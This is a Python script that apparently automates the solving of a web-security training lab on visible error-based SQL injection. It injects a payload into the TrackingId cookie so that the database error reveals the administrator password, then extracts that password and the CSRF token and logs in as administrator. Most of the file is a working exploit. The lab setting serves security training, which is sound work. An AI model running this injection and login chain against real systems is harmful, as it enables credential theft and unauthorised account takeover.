from colorama import Fore
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Visible error-based SQL injection"


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'TrackingId' cookie to make the database return an error containing the administrator password\n2. Extract the administrator password\n3. Fetch the login page\n4. Extract the csrf token and session cookie\n5. Login as the administrator\n6. Fetch the administrator profile\n""")

    print(f"[+] Running lab: {LAB_NAME}")

    session = requests.Session()
    session.verify = False
    session.proxies = proxies or {}

    try:
        # Step 1: Injecting payload to cause error leak with admin password
        print("[*] Injecting SQLi payload via TrackingId cookie...")
        payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"
        cookies = {"TrackingId": payload}

        r = session.get(
            f"{url.rstrip('/')}/filter?category=Pets", cookies=cookies)

        # Step 2: Extract admin password from error message
        print("[*] Extracting administrator password from error response...")
        admin_password = re.search(r'integer: "(.*)"', r.text).group(1)
        print(f"[+] Admin password extracted: {admin_password}")

        # Step 3: Fetch login page
        print("[*] Fetching login page...")
        r = session.get(f"{url.rstrip('/')}/login")

        # Step 4: Extract CSRF token and session cookie
        csrf_token = re.search(r'name="csrf"\s+value="(.+?)"', r.text).group(1)
        print(f"[+] CSRF token: {csrf_token}")

        # Step 5: Login as administrator
        print("[*] Logging in as administrator...")
        login_data = {
            "username": "administrator",
            "password": admin_password,
            "csrf": csrf_token
        }
        r = session.post(f"{url.rstrip('/')}/login", data=login_data)

        # Step 6: Fetch admin profile
        print("[*] Fetching /my-account page to verify login...")
        r = session.get(f"{url.rstrip('/')}/my-account")

        if "Your username is: administrator" in r.text:
            print("[+] Lab solved successfully!")
            return True
        else:
            print("[-] Login or injection did not succeed.")
            return False

    except Exception as e:
        print(f"[!] Error occurred: {e}")
        return False
